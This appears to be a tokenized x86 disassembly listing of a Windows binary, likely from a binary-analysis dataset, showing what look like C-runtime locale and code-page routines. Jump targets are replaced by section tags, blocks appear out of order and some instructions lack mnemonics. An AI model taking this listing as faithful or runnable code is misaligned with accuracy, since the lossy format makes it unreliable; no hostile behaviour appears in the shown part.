or edi eax
lea eax [ esi + 0xa4 ]
push eax
push 0x20
push [ ebp - 0x8 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_419e73
or edi eax
lea eax [ esi + 0xa8 ]
push eax
push 0x1003
push [ ebp - 0x8 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_419e73
or edi eax
lea eax [ esi + 0xb0 ]
push eax
push 0x1009
mov ebx [ ebp - 0x8 ]
push ebx
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_419e73
add esp 0x50
or edi eax
mov eax edi
pop edi
mov [ esi + 0xac ] ebx
pop ebx
leave
retn
or eax 0xffffffff
leave
retn
sub_41b034
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ esi + 0x4 ]
call sub_40fe78
push [ esi + 0x8 ]
call sub_40fe78
push [ esi + 0xc ]
call sub_40fe78
push [ esi + 0x10 ]
call sub_40fe78
push [ esi + 0x14 ]
call sub_40fe78
push [ esi + 0x18 ]
call sub_40fe78
push [ esi ]
call sub_40fe78
push [ esi + 0x20 ]
call sub_40fe78
push [ esi + 0x24 ]
call sub_40fe78
push [ esi + 0x28 ]
call sub_40fe78
push [ esi + 0x2c ]
call sub_40fe78
push [ esi + 0x30 ]
call sub_40fe78
push [ esi + 0x34 ]
call sub_40fe78
push [ esi + 0x1c ]
call sub_40fe78
push [ esi + 0x38 ]
call sub_40fe78
push [ esi + 0x3c ]
call sub_40fe78
add esp 0x40
push [ esi + 0x40 ]
call sub_40fe78
push [ esi + 0x44 ]
call sub_40fe78
push [ esi + 0x48 ]
call sub_40fe78
push [ esi + 0x4c ]
call sub_40fe78
push [ esi + 0x50 ]
call sub_40fe78
push [ esi + 0x54 ]
call sub_40fe78
push [ esi + 0x58 ]
call sub_40fe78
push [ esi + 0x5c ]
call sub_40fe78
push [ esi + 0x60 ]
call sub_40fe78
push [ esi + 0x64 ]
call sub_40fe78
push [ esi + 0x68 ]
call sub_40fe78
push [ esi + 0x6c ]
call sub_40fe78
push [ esi + 0x70 ]
call sub_40fe78
push [ esi + 0x74 ]
call sub_40fe78
push [ esi + 0x78 ]
call sub_40fe78
push [ esi + 0x7c ]
call sub_40fe78
add esp 0x40
push [ esi + 0x80 ]
call sub_40fe78
push [ esi + 0x84 ]
call sub_40fe78
push [ esi + 0x88 ]
call sub_40fe78
push [ esi + 0x8c ]
call sub_40fe78
push [ esi + 0x90 ]
call sub_40fe78
push [ esi + 0x94 ]
call sub_40fe78
push [ esi + 0x98 ]
call sub_40fe78
push [ esi + 0x9c ]
call sub_40fe78
push [ esi + 0xa0 ]
call sub_40fe78
push [ esi + 0xa4 ]
call sub_40fe78
push [ esi + 0xa8 ]
call sub_40fe78
add esp 0x2c
sub_41b1c9
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
cmp [ edi + 0x20 ] 0x0
mov ebx rwxdata
je r-xdata
mov esi ebx
push 0xb8
push 0x1
call sub_41348c
mov esi eax
pop ecx
pop ecx
test esi esi
jne r-xdata
mov [ edi ] esi
xor eax eax
add eax 0xb4
push eax
call [ InterlockedDecrement@IAT ]
mov eax edi
call sub_41ac19
test eax eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ esi + 0xb4 ] 0x1
jmp r-xdata
push esi
call sub_41b034
push esi
call sub_40fe78
pop ecx
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
add edi 0xd4
mov eax [ edi ]
cmp eax ebx
je r-xdata
sub_41b242
xor dl dl
cmp [ ecx ] dl
je r-xdata
retn
push ebx
push esi
cmp al 0x3b
jne r-xdata
cmp al 0x39
jg r-xdata
inc ecx
mov eax ecx
sub al 0x30
mov [ ecx ] al
mov al [ ecx ]
cmp al 0x30
jl r-xdata
pop esi
pop ebx
lea esi [ eax + 0x1 ]
mov bl [ esi ]
mov [ eax ] bl
mov eax esi
cmp [ eax ] dl
jne r-xdata
jmp r-xdata
cmp [ ecx ] dl
jne r-xdata
sub_41b275
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rwxdata ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rwxdata ]
je r-xdata
push eax
call sub_40fe78
pop ecx
mov esi [ esi + 0x8 ]
cmp esi [ rwxdata ]
je r-xdata
push eax
call sub_40fe78
pop ecx
push esi
call sub_40fe78
pop ecx
sub_41b2ba
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0x8 ]
push esi
xor esi esi
push edi
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] esi
cmp [ ebx + 0x1c ] esi
jne r-xdata
push 0x30
push 0x1
call sub_41348c
mov edi eax
pop ecx
pop ecx
mov [ ebp + 0x8 ] edi
cmp edi esi
jne r-xdata
cmp [ ebx + 0x18 ] esi
jne r-xdata
mov esi [ ebx + 0xbc ]
push 0xc
pop ecx
push 0x4
[ edi ] [ esi ]
call sub_413447
xor esi esi
pop ecx
mov [ ebp - 0x8 ] eax
cmp eax esi
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x8 ] esi
mov [ ebp + 0x8 ] rwxdata
jmp r-xdata
mov [ eax ] esi
cmp [ ebx + 0x1c ] esi
je r-xdata
push [ ebp + 0x8 ]
call sub_40fe78
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebx + 0xb4 ]
mov esi [ InterlockedDecrement@IAT ]
test eax eax
je r-xdata
mov ecx [ rwxdata ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ rwxdata ]
mov [ eax + 0x4 ] ecx
mov ecx [ rwxdata ]
mov [ ebp - 0x4 ] esi
mov [ eax + 0x8 ] ecx
push 0x4
call sub_413447
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax esi
jne r-xdata
mov eax [ ebx + 0xb0 ]
test eax eax
je r-xdata
push eax
call esi
mov [ eax ] ecx
mov [ eax ] esi
mov esi [ ebp + 0x8 ]
movzx edi [ ebx + 0x3e ]
push esi
push 0xe
push edi
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_419e73
mov [ ebp - 0xc ] eax
lea eax [ esi + 0x4 ]
push eax
push 0xf
push edi
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_419e73
or [ ebp - 0xc ] eax
lea eax [ esi + 0x8 ]
push eax
push 0x10
push edi
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_419e73
add esp 0x3c
or eax [ ebp - 0xc ]
je r-xdata
xor esi esi
inc esi
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xb4 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebx + 0xb0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0xbc ] eax
xor eax eax
push eax
call esi
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
jmp r-xdata
push esi
call sub_41b275
pop ecx
or esi 0xffffffff
jmp r-xdata
push [ ebx + 0xb0 ]
call sub_40fe78
push [ ebx + 0xbc ]
call sub_40fe78
pop ecx
pop ecx
cmp [ eax ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
call sub_40fe78
push [ ebp - 0x8 ]
call sub_40fe78
pop ecx
pop ecx
mov eax esi
jmp r-xdata
mov cl [ eax ]
cmp cl 0x30
jl r-xdata
jmp r-xdata
cmp cl 0x3b
jne r-xdata
cmp cl 0x39
jg r-xdata
mov eax [ ebp - 0x8 ]
xor ecx ecx
inc ecx
mov [ eax ] ecx
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
inc eax
mov esi eax
sub cl 0x30
mov [ eax ] cl
lea edi [ esi + 0x1 ]
mov cl [ edi ]
mov [ esi ] cl
mov esi edi
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
sub_41b484
xor dl dl
cmp [ ecx ] dl
je r-xdata
retn
push ebx
push esi
cmp al 0x3b
jne r-xdata
cmp al 0x39
jg r-xdata
inc ecx
mov eax ecx
sub al 0x30
mov [ ecx ] al
mov al [ ecx ]
cmp al 0x30
jl r-xdata
pop esi
pop ebx
lea esi [ eax + 0x1 ]
mov bl [ esi ]
mov [ eax ] bl
mov eax esi
cmp [ eax ] dl
jne r-xdata
jmp r-xdata
cmp [ ecx ] dl
jne r-xdata
sub_41b4b7
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
cmp eax [ rwxdata ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rwxdata ]
je r-xdata
push eax
call sub_40fe78
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rwxdata ]
je r-xdata
push eax
call sub_40fe78
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rwxdata ]
je r-xdata
push eax
call sub_40fe78
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rwxdata ]
je r-xdata
push eax
call sub_40fe78
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rwxdata ]
je r-xdata
push eax
call sub_40fe78
pop ecx
mov esi [ esi + 0x24 ]
cmp esi [ rwxdata ]
je r-xdata
push eax
call sub_40fe78
pop ecx
push esi
call sub_40fe78
pop ecx
sub_41b545
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x10 ] esi
mov [ ebp - 0xc ] edi
cmp [ esi + 0x18 ] edi
jne r-xdata
push 0x30
push 0x1
call sub_41348c
mov ebx eax
pop ecx
pop ecx
cmp ebx edi
jne r-xdata
cmp [ esi + 0x1c ] edi
jne r-xdata
push 0x4
call sub_413447
pop ecx
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] edi
mov ebx rwxdata
jmp r-xdata
mov [ eax ] edi
cmp [ esi + 0x18 ] edi
je r-xdata
push ebx
call sub_40fe78
pop edi
pop esi
pop ebx
leave
retn
mov eax [ esi + 0xb8 ]
cmp eax edi
je r-xdata
push 0xc
pop ecx
mov esi rwxdata
mov edi ebx
[ edi ] [ esi ]
push 0x4
call sub_413447
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax edi
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax edi
je r-xdata
push eax
call [ InterlockedDecrement@IAT ]
mov ecx [ ebp - 0x4 ]
mov [ ecx ] eax
mov [ eax ] edi
movzx esi [ esi + 0x38 ]
lea eax [ ebx + 0xc ]
push eax
push 0x15
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_419e73
mov edi eax
lea eax [ ebx + 0x10 ]
push eax
push 0x14
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_419e73
or edi eax
lea eax [ ebx + 0x14 ]
push eax
push 0x16
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_419e73
or edi eax
lea eax [ ebx + 0x18 ]
push eax
push 0x17
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_419e73
add esp 0x50
or edi eax
lea eax [ ebx + 0x1c ]
push eax
push 0x18
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_419e73
or edi eax
lea eax [ ebx + 0x20 ]
push eax
push 0x50
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_419e73
or edi eax
lea eax [ ebx + 0x24 ]
push eax
push 0x51
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_419e73
or edi eax
lea eax [ ebx + 0x28 ]
push eax
push 0x1a
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_419e73
add esp 0x50
or edi eax
lea eax [ ebx + 0x29 ]
push eax
push 0x19
push esi
push 0x0
lea eax [ ebp - 0x10 ]
push eax
call sub_419e73
or edi eax
lea eax [ ebx + 0x2a ]
push eax
push 0x54
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_419e73
or edi eax
lea eax [ ebx + 0x2b ]
push eax
push 0x55
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_419e73
or edi eax
lea eax [ ebx + 0x2c ]
push eax
push 0x56
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_419e73
add esp 0x50
or edi eax
lea eax [ ebx + 0x2d ]
push eax
push 0x57
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_419e73
or edi eax
lea eax [ ebx + 0x2e ]
push eax
push 0x52
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_419e73
or edi eax
lea eax [ ebx + 0x2f ]
push eax
push 0x53
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_419e73
add esp 0x3c
or eax edi
je r-xdata
push ebx
call sub_40fe78
push [ ebp - 0x8 ]
call sub_40fe78
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi + 0xb8 ] eax
mov eax [ ebp - 0x8 ]
mov [ esi + 0xb0 ] eax
mov [ esi + 0xbc ] ebx
xor eax eax
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x1c ]
jmp r-xdata
push ebx
call sub_41b4b7
push ebx
call sub_40fe78
push [ ebp - 0x8 ]
call sub_40fe78
push [ ebp - 0x4 ]
call sub_40fe78
add esp 0x10
jmp r-xdata
pop ecx
jmp r-xdata
push [ esi + 0xbc ]
call sub_40fe78
push [ esi + 0xb0 ]
call sub_40fe78
pop ecx
pop ecx
cmp [ eax ] 0x0
jne r-xdata
mov cl [ eax ]
cmp cl 0x30
jl r-xdata
jmp r-xdata
cmp cl 0x3b
jne r-xdata
cmp cl 0x39
jg r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x8 ]
add eax 0xbc
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebx ] ecx
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov [ ebx + 0x4 ] ecx
mov eax [ eax ]
mov eax [ eax + 0x8 ]
mov ecx [ ebp - 0x8 ]
mov [ ebx + 0x8 ] eax
xor eax eax
inc eax
xor edi edi
mov [ ecx ] eax
cmp [ ebp - 0x4 ] edi
je r-xdata
inc eax
mov esi eax
sub cl 0x30
mov [ eax ] cl
lea edi [ esi + 0x1 ]
mov cl [ edi ]
mov [ esi ] cl
mov esi edi
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
sub_41b80b
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x4c ] esi
mov [ ebp - 0x48 ] ebx
cmp [ esi + 0x14 ] ebx
je r-xdata
lea edi [ esi + 0xc0 ]
mov eax [ edi ]
cmp eax ebx
je r-xdata
lea eax [ esi + 0x4 ]
cmp [ eax ] ebx
jne r-xdata
mov [ edi ] ebx
mov [ esi + 0xc4 ] ebx
mov [ esi + 0xc8 ] r--data
mov [ esi + 0xcc ] r--data
mov [ esi + 0xd0 ] r--data
mov [ esi + 0xac ] 0x1
xor eax eax
push eax
call [ InterlockedDecrement@IAT ]
push 0x4
call sub_413447
push 0x2
mov edi 0x180
push edi
mov [ ebp - 0x2c ] eax
call sub_41348c
push 0x1
push edi
mov [ ebp - 0x1c ] eax
call sub_41348c
push 0x1
push edi
mov [ ebp - 0x20 ] eax
call sub_41348c
push 0x1
push 0x101
mov [ ebp - 0x28 ] eax
call sub_41348c
add esp 0x24
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0x2c ] ebx
je r-xdata
push eax
movzx eax [ esi + 0x30 ]
push 0x1004
push eax
lea eax [ ebp - 0x4c ]
push ebx
push eax
call sub_419e73
add esp 0x14
test eax eax
jne r-xdata
push [ ebp - 0x2c ]
call sub_40fe78
push [ ebp - 0x1c ]
call sub_40fe78
push [ ebp - 0x20 ]
call sub_40fe78
push [ ebp - 0x28 ]
call sub_40fe78
xor ebx ebx
add esp 0x10
inc ebx
jmp r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push [ ebp - 0x24 ]
call sub_40fe78
pop ecx
mov eax ebx
jmp r-xdata
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40b762
leave
retn
cmp [ ebp - 0x20 ] ebx
je r-xdata
cmp [ ebp - 0x28 ] ebx
je r-xdata
mov eax [ ebp - 0x2c ]
mov [ eax ] ebx
xor eax eax
mov ecx [ ebp - 0x24 ]
mov [ eax + ecx ] al
inc eax
cmp eax 0x100
jl r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x18 ] 0x5
ja r-xdata
movzx eax [ ebp - 0x18 ]
cmp eax 0x1
mov [ ebp - 0x30 ] eax
jle r-xdata
mov eax [ ebp - 0x1c ]
push ebx
push ebx
push [ esi + 0x4 ]
add eax 0x100
push eax
push 0x100
push [ ebp - 0x24 ]
mov [ ebp - 0x40 ] eax
push 0x1
push ebx
call sub_41aba8
add esp 0x20
test eax eax
je r-xdata
cmp [ ebp - 0x12 ] bl
je r-xdata
mov ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x24 ]
push ebx
push [ esi + 0x4 ]
mov edi 0xff
push edi
add ecx 0x81
push ecx
push edi
inc eax
push eax
push 0x100
push [ esi + 0x14 ]
push ebx
call sub_41a9a9
add esp 0x24
test eax eax
je r-xdata
lea eax [ ebp - 0x11 ]
mov eax [ ebp - 0x28 ]
push ebx
push [ esi + 0x4 ]
add eax 0x81
push edi
push eax
mov eax [ ebp - 0x24 ]
push edi
inc eax
push eax
push 0x200
push [ esi + 0x14 ]
push ebx
call sub_41a9a9
add esp 0x24
test eax eax
je r-xdata
movzx edi [ eax - 0x1 ]
movzx ecx cl
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov edi [ ebp - 0x20 ]
lea ecx [ eax + 0xfe ]
xor edx edx
cmp [ ebp - 0x30 ] 0x1
mov [ ecx ] dx
mov edx [ ebp - 0x28 ]
mov [ ebp - 0x3c ] ecx
lea ecx [ edi + 0x80 ]
mov [ edi + 0x7f ] bl
mov [ edx + 0x7f ] bl
mov [ ecx ] bl
mov [ ebp - 0x44 ] ecx
lea ecx [ edx + 0x80 ]
mov [ ebp - 0x38 ] ecx
mov [ ecx ] bl
jle r-xdata
cmp edi ecx
jle r-xdata
push 0xfe
lea ecx [ eax + 0x200 ]
push ecx
push eax
call sub_40f720
push 0x7f
lea eax [ edi + 0x100 ]
push eax
push edi
call sub_40f720
mov eax [ ebp - 0x28 ]
push 0x7f
lea ecx [ eax + 0x100 ]
push ecx
push eax
call sub_40f720
mov eax [ esi + 0xc0 ]
add esp 0x24
cmp eax ebx
je r-xdata
cmp [ ebp - 0x12 ] bl
je r-xdata
mov ecx [ ebp - 0x24 ]
mov [ edi + ecx ] 0x20
movzx ecx [ eax ]
inc edi
inc eax
inc eax
cmp [ eax - 0x1 ] bl
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ eax ] 0x1
mov [ esi + 0xc0 ] eax
mov eax [ ebp - 0x40 ]
mov [ esi + 0xc8 ] eax
mov eax [ ebp - 0x3c ]
mov [ esi + 0xc4 ] eax
mov eax [ ebp - 0x44 ]
mov [ esi + 0xcc ] eax
mov eax [ ebp - 0x38 ]
mov [ esi + 0xd0 ] eax
mov eax [ ebp - 0x30 ]
mov [ esi + 0xac ] eax
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
lea ecx [ ebp - 0x11 ]
mov [ ebp - 0x1c ] ecx
mov cl [ eax ]
cmp cl bl
je r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_40fe78
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_40fe78
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_40fe78
push [ esi + 0xc0 ]
call sub_40fe78
add esp 0x10
movzx ecx [ ecx - 0x1 ]
movzx edx dl
cmp ecx edx
mov [ ebp - 0x20 ] ecx
jg r-xdata
mov ecx [ ebp - 0x1c ]
inc ecx
inc ecx
mov [ ebp - 0x1c ] ecx
cmp [ ecx - 0x1 ] bl
jne r-xdata
lea ecx [ eax + ecx * 2 + 0x100 ]
jmp r-xdata
mov dl [ ecx ]
cmp dl bl
je r-xdata
inc [ ebp - 0x20 ]
mov edx 0x8000
mov [ ecx ] dx
inc ecx
inc ecx
mov [ ebp - 0x34 ] ecx
mov ecx [ ebp - 0x1c ]
movzx ecx [ ecx ]
cmp [ ebp - 0x20 ] ecx
jle r-xdata
mov ecx [ ebp - 0x34 ]
sub_41bc67
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x18 ]
xor ebx ebx
call sub_40c8c3
mov eax [ ebp - 0x18 ]
mov edi [ eax + 0xd4 ]
mov [ ebp - 0x4 ] ebx
mov esi [ ebp - 0x4 ]
shl esi 0x2
push [ esi + edi + 0x1c ]
call sub_4136f0
push [ esi + edi ]
mov [ ebp - 0x8 ] eax
call sub_4136f0
add eax ebx
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x7
pop ecx
pop ecx
mov ecx [ ebp - 0x8 ]
lea ebx [ eax + ecx + 0x2 ]
jb r-xdata
lea eax [ ebx + 0x1 ]
push eax
call sub_413447
mov esi eax
pop ecx
mov [ ebp - 0x8 ] esi
test esi esi
je r-xdata
cmp [ ebp - 0xc ] 0x0
pop edi
pop esi
pop ebx
je r-xdata
and [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x8 ]
leave
retn
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
push esi
call sub_4136f0
add esi eax
mov eax [ ebp - 0x4 ]
mov [ esi ] 0x3a
push [ edi + eax * 4 + 0x1c ]
mov eax [ ebp - 0x8 ]
inc esi
sub eax esi
lea eax [ eax + ebx + 0x1 ]
push eax
push esi
call sub_4192c8
add esp 0x10
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_40d5e2
add esp 0x14
push esi
call sub_4136f0
add esi eax
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x7
pop ecx
jb r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_40d5e2
add esp 0x14
mov eax [ ebp - 0x4 ]
mov [ esi ] 0x3a
push [ edi + eax * 4 ]
mov eax [ ebp - 0x8 ]
inc esi
sub eax esi
lea eax [ eax + ebx + 0x1 ]
push eax
push esi
call sub_4192c8
add esp 0xc
test eax eax
je r-xdata
mov [ esi ] 0x0
sub_41bd70
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x1c ]
xor ebx ebx
call sub_40c8c3
mov eax [ ebp - 0x1c ]
mov edi [ eax + 0xd4 ]
lea esi [ edi + 0x38 ]
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x8 ] 0xc
push [ esi + 0x30 ]
call sub_4136f0
push [ esi ]
mov [ ebp - 0xc ] eax
call sub_4136f0
mov esi [ ebp - 0x4 ]
pop ecx
pop ecx
mov ecx [ ebp - 0xc ]
add eax ebx
add esi 0x4
dec [ ebp - 0x8 ]
lea ebx [ eax + ecx + 0x2 ]
mov [ ebp - 0x4 ] esi
jne r-xdata
lea eax [ ebx + 0x1 ]
push eax
call sub_413447
mov esi eax
pop ecx
mov [ ebp - 0x4 ] esi
test esi esi
je r-xdata
cmp [ ebp - 0x10 ] 0x0
pop edi
pop esi
pop ebx
je r-xdata
add edi 0x68
mov [ ebp - 0x8 ] 0xc
mov eax [ ebp - 0x4 ]
leave
retn
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
push esi
call sub_4136f0
add esi eax
mov eax [ ebp - 0x4 ]
mov [ esi ] 0x3a
push [ edi ]
inc esi
sub eax esi
lea eax [ eax + ebx + 0x1 ]
push eax
push esi
call sub_4192c8
add esp 0x10
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_40d5e2
add esp 0x14
push esi
call sub_4136f0
add esi eax
add edi 0x4
dec [ ebp - 0x8 ]
pop ecx
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_40d5e2
add esp 0x14
mov eax [ ebp - 0x4 ]
mov [ esi ] 0x3a
push [ edi - 0x30 ]
inc esi
sub eax esi
lea eax [ eax + ebx + 0x1 ]
push eax
push esi
call sub_4192c8
add esp 0xc
test eax eax
je r-xdata
mov [ esi ] 0x0
sub_41be79
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
push ebx
push esi
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x24 ]
xor edi edi
call sub_40c8c3
mov eax [ ebp - 0x24 ]
mov esi [ eax + 0xd4 ]
mov [ ebp - 0x4 ] edi
mov ebx [ ebp - 0x4 ]
shl ebx 0x2
push [ ebx + esi + 0x1c ]
call sub_4136f0
push [ ebx + esi ]
mov [ ebp - 0x14 ] eax
call sub_4136f0
add eax edi
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x7
pop ecx
pop ecx
mov ecx [ ebp - 0x14 ]
lea edi [ eax + ecx + 0x2 ]
jb r-xdata
lea eax [ esi + 0x38 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xc
mov ebx [ ebp - 0x10 ]
push [ ebx + 0x30 ]
call sub_4136f0
push [ ebx ]
mov [ ebp - 0x14 ] eax
call sub_4136f0
add [ ebp - 0x10 ] 0x4
pop ecx
pop ecx
mov ecx [ ebp - 0x14 ]
add eax edi
dec [ ebp - 0xc ]
lea edi [ eax + ecx + 0x2 ]
jne r-xdata
push [ esi + 0x9c ]
call sub_4136f0
push [ esi + 0x98 ]
mov ebx eax
call sub_4136f0
push [ esi + 0xa0 ]
add eax edi
lea edi [ eax + ebx + 0x2 ]
call sub_4136f0
push [ esi + 0xa4 ]
lea edi [ edi + eax + 0x1 ]
call sub_4136f0
push [ esi + 0xa8 ]
lea edi [ edi + eax + 0x1 ]
call sub_4136f0
lea eax [ edi + eax + 0xb9 ]
push eax
mov [ ebp - 0x8 ] eax
call sub_413447
mov ebx eax
add esp 0x18
test ebx ebx
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0xb8
push esi
push ebx
lea edi [ ebx + 0xb8 ]
call sub_40f720
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x1c ]
mov [ ebp - 0x10 ] ebx
add esp 0xc
sub [ ebp - 0x10 ] esi
mov [ ebp - 0xc ] eax
pop edi
pop esi
mov eax ebx
pop ebx
leave
retn
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
push edi
call sub_4136f0
mov ecx [ ebp - 0x10 ]
lea edi [ edi + eax + 0x1 ]
mov eax [ ebp - 0xc ]
mov [ ecx + eax ] edi
push [ eax ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
push eax
push edi
call sub_4192c8
add esp 0x10
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_40d5e2
add esp 0x14
push edi
call sub_4136f0
inc [ ebp - 0x4 ]
add [ ebp - 0xc ] 0x4
cmp [ ebp - 0x4 ] 0x7
pop ecx
lea edi [ edi + eax + 0x1 ]
jb r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_40d5e2
add esp 0x14
mov eax [ ebp - 0x4 ]
mov [ ebx + eax * 4 ] edi
mov eax [ ebp - 0xc ]
push [ eax - 0x1c ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
push eax
push edi
call sub_4192c8
add esp 0xc
test eax eax
je r-xdata
lea eax [ ebx + 0x68 ]
mov [ ebp - 0x4 ] eax
lea eax [ esi + 0x38 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x14 ] 0xc
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ eax + ecx ] edi
push [ eax ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
push eax
push edi
call sub_4192c8
add esp 0xc
test eax eax
je r-xdata
push edi
call sub_4136f0
lea edi [ edi + eax + 0x1 ]
mov eax [ ebp - 0x4 ]
mov [ eax ] edi
mov eax [ ebp - 0xc ]
push [ eax + 0x30 ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
push eax
push edi
call sub_4192c8
add esp 0x10
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_40d5e2
add esp 0x14
push edi
call sub_4136f0
add [ ebp - 0xc ] 0x4
add [ ebp - 0x4 ] 0x4
dec [ ebp - 0x14 ]
pop ecx
lea edi [ edi + eax + 0x1 ]
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_40d5e2
add esp 0x14
mov eax [ ebp - 0xc ]
